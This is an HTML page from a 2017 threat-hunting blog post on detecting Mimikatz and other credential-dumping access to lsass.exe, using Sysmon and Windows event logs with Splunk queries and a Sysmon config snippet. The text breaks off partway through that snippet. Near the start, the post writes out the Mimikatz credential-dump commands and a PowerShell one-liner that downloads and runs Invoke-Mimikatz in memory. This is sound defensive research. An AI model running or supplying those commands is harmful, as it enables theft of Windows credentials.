@@ -1,0 +1,732 @@
+<html lang="en"><!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 --><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="norton-safeweb-site-verification" content="jto91ifac4exfj0dg6cbo69shuhhkrl7moylac3vk7l8zipbiufkuoqyrf38t5msmej7-e7hem0192eabxb-nrny2egtsvfqwt6j3qw9aksn9v3e5dwoei3agh3jgim7">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202406110101/show_ads_impl_with_ama_fy2021.js?client=ca-pub-7968060656468551&amp;plah=www.eideon.com&amp;aplac=true"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7968060656468551" crossorigin="anonymous" data-checked-head="true"></script>
+
+  <title>Tales of a Threat Hunter 1</title>
+
+  <meta name="author" content="Diego Perez">
+
+  
+  <meta name="description" content="Detecting Mimikatz &amp; other Suspicious LSASS Access - Part 1">
+  
+
+  <link rel="alternate" type="application/rss+xml" title="eideon - Investigations into the transient fluctuations of reality in the cybersphere" href="/feed.xml">
+
+  
+
+  
+    
+      
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+      <link rel="stylesheet" href="/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/css/main.css">
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+    
+  
+
+  
+
+  
+
+  
+
+    <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Tales of a Threat Hunter 1">
+  
+
+   
+  <meta property="og:description" content="Detecting Mimikatz &amp; other Suspicious LSASS Access - Part 1">
+  
+
+
+  <meta property="og:type" content="website">
+
+  
+  <meta property="og:url" content="https://eideon.com/2017-09-09-THL01-Mimikatz/">
+  <link rel="canonical" href="https://eideon.com/2017-09-09-THL01-Mimikatz/">
+  
+
+  
+  <meta property="og:image" content="https://eideon.com/img/OneLoop_2.png">
+  
+  
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@darkquassar">
+  <meta name="twitter:creator" content="@darkquassar">
+
+  
+  <meta name="twitter:title" content="Tales of a Threat Hunter 1">
+  
+
+  
+  <meta name="twitter:description" content="Detecting Mimikatz &amp; other Suspicious LSASS Access - Part 1">
+  
+
+  
+  <meta name="twitter:image" content="https://eideon.com/img/OneLoop_2.png">
+  
+
+  <meta name="keywords" content="keyword1, keyword2,nsw-jto91ifac4exfj0dg6cbo69shuhhkrl7moylac3vk7l8zipbiufkuoqyrf38t5msmej7-e7hem0192eabxb-nrny2egtsvfqwt6j3qw9aksn9v3e5dwoei3agh3jgim7">
+<meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"></head>
+
+
+  <body>
+
+    
+  
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      
+        <a class="navbar-brand" href="https://eideon.com">eideon</a>
+      
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+      
+        
+          <li>
+            
+            
+
+
+
+
+
+<a href="/aboutme">About Me</a>
+
+          </li>
+        
+        
+      </ul>
+    </div>
+
+	
+	<div class="avatar-container">
+	  <div class="avatar-img-border">
+	    <a href="https://eideon.com ">
+	      <img class="avatar-img" src="/img/OneLoop_2.png">
+		</a>
+	  </div>
+	</div>
+	
+
+  </div>
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Tales of a Threat Hunter 1</h1>
+		  
+		    
+			<h2 class="post-subheading">Detecting Mimikatz &amp; other Suspicious LSASS Access - Part 1</h2>
+			
+		  
+		  
+		  
+		  <span class="post-meta">Posted on September 9, 2017</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      <article role="main" class="blog-post">
+        <ul id="markdown-toc">
+  <li><a href="#chasing-down-powershellmafia" id="markdown-toc-chasing-down-powershellmafia">Chasing down PowershellMafia</a></li>
+  <li><a href="#threat-profile" id="markdown-toc-threat-profile">Threat Profile</a></li>
+  <li><a href="#mimikatz-as-a-standalone-executable" id="markdown-toc-mimikatz-as-a-standalone-executable">Mimikatz as a standalone executable</a>    <ul>
+      <li><a href="#hunting-with-sysmon-events-only" id="markdown-toc-hunting-with-sysmon-events-only">Hunting with Sysmon Events Only</a></li>
+      <li><a href="#hunting-with-sysmon-and-windows-events" id="markdown-toc-hunting-with-sysmon-and-windows-events">Hunting with Sysmon and Windows Events</a></li>
+      <li><a href="#detection-artifact-i" id="markdown-toc-detection-artifact-i">Detection Artifact I</a></li>
+    </ul>
+  </li>
+  <li><a href="#running-mimikatz-from-memory-using-invoke-mimikatz-from-powersploit" id="markdown-toc-running-mimikatz-from-memory-using-invoke-mimikatz-from-powersploit">Running Mimikatz from memory using Invoke-Mimikatz from PowerSploit</a>    <ul>
+      <li><a href="#hunting-with-sysmon-and-windows-events-1" id="markdown-toc-hunting-with-sysmon-and-windows-events-1">Hunting with Sysmon and Windows Events</a></li>
+      <li><a href="#detection-artifact-ii" id="markdown-toc-detection-artifact-ii">Detection Artifact II</a></li>
+      <li><a href="#detection-artifact-iii" id="markdown-toc-detection-artifact-iii">Detection Artifact III</a></li>
+      <li><a href="#detection-artifact-iv" id="markdown-toc-detection-artifact-iv">Detection Artifact IV</a></li>
+    </ul>
+  </li>
+  <li><a href="#changes-to-your-sysmon-config" id="markdown-toc-changes-to-your-sysmon-config">Changes to your Sysmon Config</a>    <ul>
+      <li><a href="#updates" id="markdown-toc-updates">Updates</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="chasing-down-powershellmafia">Chasing down PowershellMafia</h1>
+<p>In the first of my tales we will analyze the behaviour of tools that need to read from Lsass.exe process’ memory in order to steal valuable credential information. For this, we will begin with Mimikatz, as it’s quite renowned and we all like <a href="https://github.com/gentilkiwi/mimikatz/wiki">gentilkiwi</a>! We will investigate Mimikatz’ behaviour whilst running as a standalone executable and whilst running from memory (fileless scenario).</p>
+
+<p>After a sweep of the artifacts that are observable using standard Windows/Sysmon logs, we will detonate Mimikatz and analize its memory traces using Volatility to evaluate if we can find any markers that will allow us to create other Yara/SIEM rules.
+Finally, the goal is to run other credential dumping tools and attempt to identify any commonalities that could provide for a more abstract IOC.</p>
+
+<p>Our end goal: to develop detection artifacts (IOCs, Correlation Rules, Other Signatures, etc.) that would allow us to capture most of the tricks used by the wizards of powershellmafia. Terrible things wait for us ahead, are you brave enough? ヾ(⌐■_■)ノ</p>
+
+<h1 id="threat-profile">Threat Profile</h1>
+<p>For the purposes of starting a classification of the threats that will be explored in these series, let’s begin with a rough categorization scheme that will evolve into a more complete threat ontology framework.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Category</strong></td>
+      <td>Exfiltration</td>
+    </tr>
+    <tr>
+      <td><strong>Type</strong></td>
+      <td>lsass process injection/manipulation/read</td>
+    </tr>
+    <tr>
+      <td><strong>Execution Types</strong></td>
+      <td>in-memory (fileless) or standalone executable</td>
+    </tr>
+    <tr>
+      <td><strong>Detection Ratio</strong></td>
+      <td>80%</td>
+    </tr>
+    <tr>
+      <td><strong>PoC Tools</strong></td>
+      <td>Mimikatz / Inject-LogonCredentials / Invoke-ReflectivePEInjection</td>
+    </tr>
+    <tr>
+      <td><strong>Hunting Method</strong></td>
+      <td>Grouping</td>
+    </tr>
+    <tr>
+      <td><strong>Test OS</strong></td>
+      <td>Win10 (OS Build 14393.321)</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="mimikatz-as-a-standalone-executable">Mimikatz as a standalone executable</h1>
+<p>Here we focus solely on the most popular combination of commands (same applies for in-memory Mimikatz):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+sekurlsa::logonpasswords
+</code></pre></div></div>
+
+<p>For in-memory Mimikatz we will also test it by direct download via powershell rather than downloading the script to disk:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia
+/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+</code></pre></div></div>
+
+<h2 id="hunting-with-sysmon-events-only">Hunting with Sysmon Events Only</h2>
+
+<p>To begin these series, we will use Splunk (the free version, I will also add some snips for ELK later) due to its powerful query language and ease of use, to cut the time from logging to identification.</p>
+
+<p>First thing we observe is that, when running Mimikatz as a standalone executable, we have ~84 events in total within a timewindow of 3s (<em>this is relevant in the sense that your IOC or Correlation Rule shouldn’t be looking for signs beyond the 5s window</em>):</p>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-00.PNG" alt="ToTH1-00"></p>
+
+<p>If we reduce those events to their unique instances and sort them by time we get the following sequence:</p>
+<pre><code class="language-Markdown">Query: "mimikatz"  NOT "EventCode=4658"  NOT "EventCode=4689" | dedup EventCode
+</code></pre>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-01.PNG" alt="ToTH1-01"></p>
+
+<p>If we look at the EventCode field which holds the value of the Windows Security or Sysmon Event ID we can observe the following sequence:</p>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-02.PNG" alt="ToTH1-02"></p>
+
+<p>With all this info we should be able to craft a detection artifact based on a time-ordered sequence of events, on the one side, and an unordered BOOLEAN logic on the other. So let’s delve into the sequence of generated events to determine if we can extract a valid pattern for our detection artifact.</p>
+
+<p>First, Sysmon “Process Create” (EventCode 1):</p>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-03.PNG" alt="ToTH1-03"></p>
+
+<p>Not much to see here, hashes and “cmd.exe” as ParentImage are the only interesting markers, but an intruder could easily modify 1byte in the Mimikatz code to render hash detection useless, and “cmd.exe” may not always be the parent of the process.</p>
+
+<p>Next is a series of EventCode 10, which equates to Sysmon’s “Process Accessed”</p>
+<pre><code class="language-Markdown">Query: "mimikatz"  NOT "EventCode=4658"  NOT "EventCode=4689"  EventCode=10 | stats count by  _time, SourceImage, TargetImage, GrantedAccess 
+</code></pre>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-04.PNG" alt="ToTH1-04"></p>
+
+<div class="alert alert-info" role="alert"><i class="fa fa-info-circle"></i> <b>Note:</b> Interestingly enough, we can see here that Mimikatz accessing lsass.exe happens after a series of events where the Mimikatz process itself is accessed by other processes like cmd, conhost, csrss, taskmgr, and lsass itself (!) followed by wmiprvse. The first three we can discard, as they are generated due to the fact we are launching Mimikatz from the commandline. However, an interesting pattern to look for may be that, immediately before Mimikatz reads from lsass’ memory, lsass itself reads from Mimikatz’s one. </div>
+
+<p>The interesting info about lsass accessing Mimikatz can be seen here:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GrantedAccess: 0x1478
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a5314|C:\Windows\system32\lsasrv.dll+d127|C:\Windows\system32\lsasrv.dll+e1dd|C:\Windows\system32\lsasrv.dll+cfa5|C:\Windows\SYSTEM32\SspiSrv.dll+11a2|C:\Windows\System32\RPCRT4.dll+77de3|C:\Windows\System32\RPCRT4.dll+dbc6d|C:\Windows\System32\RPCRT4.dll+a8dc|C:\Windows\System32\RPCRT4.dll+5a194|C:\Windows\System32\RPCRT4.dll+590ad|C:\Windows\System32\RPCRT4.dll+5995b|C:\Windows\System32\RPCRT4.dll+39afc|C:\Windows\System32\RPCRT4.dll+39f7c|C:\Windows\System32\RPCRT4.dll+5426c|C:\Windows\System32\RPCRT4.dll+55acb|C:\Windows\System32\RPCRT4.dll+485ca|C:\Windows\SYSTEM32\ntdll.dll+325fe|C:\Windows\SYSTEM32\ntdll.dll+330d9|C:\Windows\System32\KERNEL32.DLL+8364|C:\Windows\SYSTEM32\ntdll.dll+65e91
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GrantedAccess: 0x1000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a5ea4|C:\Windows\System32\RPCRT4.dll+10a1f|C:\Windows\system32\lsasrv.dll+ceed|C:\Windows\SYSTEM32\SspiSrv.dll+11a2|C:\Windows\System32\RPCRT4.dll+77de3|C:\Windows\System32\RPCRT4.dll+dbc6d|C:\Windows\System32\RPCRT4.dll+a8dc|C:\Windows\System32\RPCRT4.dll+5a194|C:\Windows\System32\RPCRT4.dll+590ad|C:\Windows\System32\RPCRT4.dll+5995b|C:\Windows\System32\RPCRT4.dll+39afc|C:\Windows\System32\RPCRT4.dll+39f7c|C:\Windows\System32\RPCRT4.dll+5426c|C:\Windows\System32\RPCRT4.dll+55acb|C:\Windows\System32\RPCRT4.dll+485ca|C:\Windows\SYSTEM32\ntdll.dll+325fe|C:\Windows\SYSTEM32\ntdll.dll+330d9|C:\Windows\System32\KERNEL32.DLL+8364|C:\Windows\SYSTEM32\ntdll.dll+65e91
+</code></pre></div></div>
+
+<p>After this interaction, Mimikatz finally decides to access lsass:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GrantedAccess: 0x1010
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a5314|C:\Windows\System32\KERNELBASE.dll+2940d|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+6dc6c|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+6dfd9|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+6db91|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+4ae04|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+4ac3a|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+4aa21|C:\Users\Artanis\Documents\mimikatz_trunk\x64\mimikatz.exe+73935|C:\Windows\System32\KERNEL32.DLL+8364|C:\Windows\SYSTEM32\ntdll.dll+65e91
+</code></pre></div></div>
+
+<p>The next interesting Event is EventCode 7 or Sysmon’s “Image Loaded”:</p>
+
+<figure class="highlight"><pre><code class="language-markdown" data-lang="markdown">Query: "mimikatz"  NOT "EventCode=4658"  NOT "EventCode=4689"  EventCode=10 | stats count by  _time, SourceImage, TargetImage, GrantedAccess </code></pre></figure>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-05.PNG" alt="ToTH1-05"></p>
+
+<p>We can see all the modules that are imported by Mimikatz in order to be able to do its thing. These constitute a good marker as well, not by themselves but in conjuntion with our other events.</p>
+
+<p>Next in the line we find a Sysmon Event 11 “File Create” which points to the creation of a pre-fetch record for Mimikatz created by SVCHOST which is hosting Windows’ prefetch service:</p>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-06.PNG" alt="ToTH1-06"></p>
+
+<p>We then observe Sysmon’s Event ID 8 which corresponds to “Create Remote Thread”, curiously enough, it’s WmiPrvSE the one starting a remote threat on Mimikatz, we never thought Mimikatz itself was going the be the victim instead of the victimator!</p>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-07.PNG" alt="ToTH1-07"></p>
+
+<p>After this, we observe a sequence similar to the one described in the previous Sysmon Event ID 10, where Mimikatz is accessed by a few processes and finally accesses lsass (same Access Mask [0x1010] and Call Trace).</p>
+
+<h2 id="hunting-with-sysmon-and-windows-events">Hunting with Sysmon and Windows Events</h2>
+
+<p>This hunt gets even more interesting when we start observing Windows Security and Sysmon Events intertwined together</p>
+<pre><code class="language-Markdown">Query: "mimikatz"  NOT "EventCode=4658"  NOT "EventCode=4689" | stats count by EventCode, _time | sort _time
+</code></pre>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-08.PNG" alt="ToTH1-08"></p>
+
+<p>Here we notice that Events <strong>4663</strong> (<em>An attempt was made to access an object</em>), <strong>4656</strong> (<em>A handle to an Object was requested</em>), <strong>4703</strong> (<em>Token Right Adjusted</em>) and <strong>4673</strong> (<em>Sensitive Privilege Use</em>) are showing up. Their presence makes sense, due to the operations that Mimikatz has to go through in order to access lsass process’ memory. As you can see, it’s starting to look quite hard for such a program to hide from event traces. Of course, Mimikatz could also be loaded from memory in a fileless scenario, and event log tracing could be disabled with tools like <a href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a>, however, as we’ll see, <em>these techniques can also leave traces</em>. If the right audit policy is configured in your environment, even tools that interfere with and wipe Windows Event Logs <em>need to load first</em> and acquire a few OS privileges before doing evil right? And if you have a centralized logging system like a SIEM (again, as long as your log forwarding policy is properly configured) you will always have a trace of events even when they could have even been wiped out of the source host.</p>
+
+<p>So if we actually break this down to the sequence of traces left behind by a Mimikatz file execution under the new scenario we have this:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>EventCode</th>
+      <th>_time</th>
+      <th>Comment</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>2017-09-04T16:52:32.000-0700</td>
+      <td>Sysmon Process Create: Mimikatz started</td>
+    </tr>
+    <tr>
+      <td>4673</td>
+      <td>2017-09-04T16:52:32.000-0700</td>
+      <td>Sensitive Privilege Use (Failure): SeTcbPrivilege requested by mimikatz.exe</td>
+    </tr>
+    <tr>
+      <td>4688</td>
+      <td>2017-09-04T16:52:32.000-0700</td>
+      <td>A new Process has been created (we knew this via Sysmon already)</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>2017-09-04T16:52:32.000-0700</td>
+      <td>Sysmon Image Loaded: A few events where Mimikatz loads all its required modules</td>
+    </tr>
+    <tr>
+      <td>4703</td>
+      <td>2017-09-04T16:52:35.000-0700</td>
+      <td>Token Right Adjusted: Enabled Privileges: SeDebugPrivilege / Process Name: mimikatz.exe</td>
+    </tr>
+    <tr>
+      <td>10</td>
+      <td>2017-09-04T16:52:41.000-0700</td>
+      <td>Sysmon Process Accessed: Source Image: mimikatz.exe / Target Image: lsass.exe / GrantedAcces: 0x1010 / CallTrace: multiple markers (see above)</td>
+    </tr>
+    <tr>
+      <td>4656</td>
+      <td>2017-09-04T16:52:41.000-0700</td>
+      <td>A handle to an object was requested: Process Name: mimikatz.exe / Accesses: Read from process memory / Acess Mask: 0x1010</td>
+    </tr>
+    <tr>
+      <td>4663</td>
+      <td>2017-09-04T16:52:41.000-0700</td>
+      <td>An attempt was made to access an object: Process Name: mimikatz.exe / Access Mask: 0x10</td>
+    </tr>
+    <tr>
+      <td>11</td>
+      <td>2017-09-04T16:52:42.000-0700</td>
+      <td>Sysmon File Created: Image: svchost.exe / TargetFileName: C:\Windows\Prefetch\MIMIKATZ.EXE-CE8DB7C6.pf</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="detection-artifact-i">Detection Artifact I</h2>
+<p>During our lab tests using Sysmon Event 10 (Process Accessed) proved to be most efficient. A Splunk query similar to this:</p>
+<pre><code class="language-Markdown">EventCode=10 | where (GrantedAccess="0x1010" AND TargetImage LIKE "%lsass.exe")
+</code></pre>
+<p>should get you pretty close to pinpointing some weird lsass.exe access ;)</p>
+
+<p>However you could combine this marker along with the preceeding or following Windows Events to create a more robust detection for your SIEM solution via <strong>event correlation</strong>.</p>
+
+<h1 id="running-mimikatz-from-memory-using-invoke-mimikatz-from-powersploit">Running Mimikatz from memory using Invoke-Mimikatz from PowerSploit</h1>
+<p>For this next lab test, we will leverage the known <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">PowerSploit module</a> to load Mimikatz in memory without touching disk. The script was run at around 12:00:25.</p>
+
+<h2 id="hunting-with-sysmon-and-windows-events-1">Hunting with Sysmon and Windows Events</h2>
+
+<p>If we run the following search, limiting ourselves to the bare minimum progression of unique Events:</p>
+<pre><code class="language-Markdown">powershell OR lsass | dedup TaskCategory | stats count by _time, EventCode | chart count by EventCode
+</code></pre>
+
+<p>We get the following picture:</p>
+
+<p><img src="../img/THL001-Mimikatz/Mimi-09.PNG" alt="ToTH1-09"></p>
+
+<p>Which can be broken down into:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Time</th>
+      <th>Comment</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>09/06/2017 11:55:33 PM</td>
+      <td>So we find that the only process that resembles the “CallTrace” parameter observed for the standalone Mimikatz is wininit.exe.</td>
+    </tr>
+    <tr>
+      <td>09/06/2017 11:55:33 PM</td>
+      <td>Pipe Created event where lsass.exe creates PipeName: \lsass</td>
+    </tr>
+    <tr>
+      <td>09/06/2017 11:55:33 PM</td>
+      <td>We have a “Pipe Connected” event where “C:\Windows\system32\svchost.exe” uses “PipeName: \lsass”</td>
+    </tr>
+    <tr>
+      <td>09/06/2017 11:56:44 PM</td>
+      <td>When powershell is started to host the malicious script it needs to start as “admin” which creates an EventCode 4703 (Token Right Adjusted) with the “SeDebugPrivilege”. This can be used in a transactional search disregarding the name of the process and searching for the process ID instead across different events.</td>
+    </tr>
+    <tr>
+      <td>09/07/2017 12:00:25 AM</td>
+      <td>EventCode 4656 (A handle to an object was requested) - Process Name is “powershell”; Access Mask is 0x143A; Accesses are: “Create new thread in process; Perform virtual memory operation; Read from process memory; Write to process memory; Query process information”</td>
+    </tr>
+    <tr>
+      <td>09/07/2017 12:00:25 AM</td>
+      <td>EventCode 4663 (An attempt was made to access an object) - Process Name is “powershell”; Access Mask is 0x10; Object Name is “\Device\HarddiskVolume2\Windows\System32\lsass.exe”</td>
+    </tr>
+    <tr>
+      <td>09/07/2017 12:00:25 AM</td>
+      <td>EventCode 4673 (A privileged service was called) - Powershell fails to obtain SeTcbPrivilege; a behaviour we already observed with the standalone Mimikatz</td>
+    </tr>
+    <tr>
+      <td>09/07/2017 12:00:25 AM</td>
+      <td>EventCode 4690 (An attempt was made to duplicate a handle to an object) - Source Process ID matches that of Powershell and the Target Process ID is System (0x4)</td>
+    </tr>
+    <tr>
+      <td>09/07/2017 12:00:35 AM</td>
+      <td>EventCode 4673 (Sensitive Privilege Use) - lsass seems to invoke LsaRegisterLogonProcess() Service from the NT Local Security Authority Server. This happens 10s after Invoke-Mimikatz.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="detection-artifact-ii">Detection Artifact II</h2>
+<p>During our lab tests using Windows Event 4656 for detection of Mimikatz activity proved to be most efficient. A Splunk query similar to this:</p>
+<pre><code class="language-Markdown">EventCode=4656 OR EventCode=4663 | eval HandleReq=case(EventCode=4656 AND Object_Name LIKE "%lsass.exe" AND Access_Mask=="0x143A", Process_ID) | where (HandleReq=Process_ID)
+</code></pre>
+<p>or this</p>
+<pre><code class="language-Markdown">EventCode=4656 | where (Object_Name LIKE "%lsass.exe" AND Access_Mask=="0x143A")
+</code></pre>
+
+<p>constitute great candidates for an alert.</p>
+
+<h2 id="detection-artifact-iii">Detection Artifact III</h2>
+<p>Tested with the Empire version of Invoke-Mimikatz and realised that Access_Mask changes from “0x143A” to “0x1410”. This time however, when running this other version the Access_Mask generates more FP so we need to couple it with another AND gate that looks for processes finishing with “shell.exe” (<em>powershell.exe</em>). The caveat is that it will be easier to bypass ‘cause an attacker can always change the name of the powershell executable or <a href="https://github.com/p3nt4/PowerShdll/tree/master/dll">load powershell without powershell!</a> using a few dlls. If we couple this new detection with the other observed windows events though, a more robust signature may emerge.</p>
+
+<pre><code class="language-Markdown">EventCode=4656 | where ((Object_Name LIKE "%lsass.exe" AND Access_Mask=="0x143A") OR (Process_Name LIKE "%shell.exe" AND Object_Name LIKE "%lsass.exe" AND Access_Mask=="0x1410")
+</code></pre>
+
+<h2 id="detection-artifact-iv">Detection Artifact IV</h2>
+<p>Tested with standalone Mimikatz from a Windows Server 2016 and this time, Access_Mask changes to “0x1010” which is more common than not. Most of all you will see svchost.exe accessing lsass with this mask. So this time we need to elaborate a correlation rule. We will use Sysmon Event 1 (ProcessCreate) and Event 10 (ProcessAccessed):</p>
+<pre><code class="language-Markdown">SEQUENCE: 
+1. EventCode=1 | where (match(ParentImage, "cmd.exe") AND match(IntegrityLevel, "high"))
+2. EventCode=10 | where (match(GrantedAccess, "0x1010") AND !match(SourceImage, "svchost\.exe") AND match(TargetImage, "lsass\.exe"))
+</code></pre>
+
+<p>In the next article, we shall continue to explore other artifacts left behind by Mimikatz’s execution in memory as well as what type of events are generated by tools like <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-CredentialInjection.ps1">Invoke-CredentialInjection</a>. Later, we will run Mimikatz in the context of its several Kerberos-fooling techniques to see if we can detect spoofed Tickets and other treachery ;).</p>
+
+<h1 id="changes-to-your-sysmon-config">Changes to your Sysmon Config</h1>
+<p>Add the following to your sysmon config file to be able to detect this type of lsass access:</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="c">&lt;!--SYSMON EVENT ID 10 : INTER-PROCESS ACCESS--&gt;</span>
+<span class="c">&lt;!--DATA: UtcTime, SourceProcessGuid, SourceProcessId, SourceThreadId, SourceImage, TargetProcessGuid, TargetProcessId, TargetImage, GrantedAccess, CallTrace--&gt;</span>
+<span class="nt">&lt;ProcessAccess</span> <span class="na">onmatch=</span><span class="s">"include"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;TargetImage</span> <span class="na">condition=</span><span class="s">"contains"</span><span class="nt">&gt;</span>lsass.exe<span class="nt">&lt;/TargetImage&gt;</span>
+<span class="nt">&lt;/ProcessAccess&gt;</span>
+<span class="nt">&lt;ProcessAccess</span> <span class="na">onmatch=</span><span class="s">"exclude"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>wmiprvse.exe<span class="nt">&lt;/SourceImage&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>GoogleUpdate.exe<span class="nt">&lt;/SourceImage&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>LTSVC.exe<span class="nt">&lt;/SourceImage&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>taskmgr.exe<span class="nt">&lt;/SourceImage&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>VBoxService.exe<span class="nt">&lt;/SourceImage&gt;</span> # Virtual Box
